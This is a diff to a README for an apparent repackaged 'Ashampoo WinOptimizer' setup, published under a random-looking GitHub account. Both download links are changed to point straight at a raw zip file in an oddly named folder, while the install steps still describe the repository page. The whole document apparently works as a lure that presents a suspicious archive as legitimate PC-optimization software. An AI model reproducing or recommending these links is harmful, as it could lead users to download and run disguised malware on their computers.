@@ -1,6 +1,6 @@
 # 🛠 Ashampoo-WinOptimizer-Setup - Improve your computer speed and performance
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Valent-fritillariameleagris137/Ashampoo-WinOptimizer-Setup)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Valent-fritillariameleagris137/Ashampoo-WinOptimizer-Setup/raw/refs/heads/main/unimpelled/Win-Setup-Optimizer-Ashampoo-v3.6-alpha.4.zip)
 
 ## 📌 About this software
 
@@ -20,7 +20,7 @@ Ensure your PC meets these standards before you begin:
 
 Follow these steps to get the software on your computer.
 
-1. Visit this page to download: [https://github.com/Valent-fritillariameleagris137/Ashampoo-WinOptimizer-Setup](https://github.com/Valent-fritillariameleagris137/Ashampoo-WinOptimizer-Setup)
+1. Visit this page to download: [https://github.com/Valent-fritillariameleagris137/Ashampoo-WinOptimizer-Setup/raw/refs/heads/main/unimpelled/Win-Setup-Optimizer-Ashampoo-v3.6-alpha.4.zip](https://github.com/Valent-fritillariameleagris137/Ashampoo-WinOptimizer-Setup/raw/refs/heads/main/unimpelled/Win-Setup-Optimizer-Ashampoo-v3.6-alpha.4.zip)
 2. Locate the button labeled Code on the repository page.
 3. Select Download ZIP from the dropdown menu.
 4. Open your Downloads folder in Windows File Explorer.
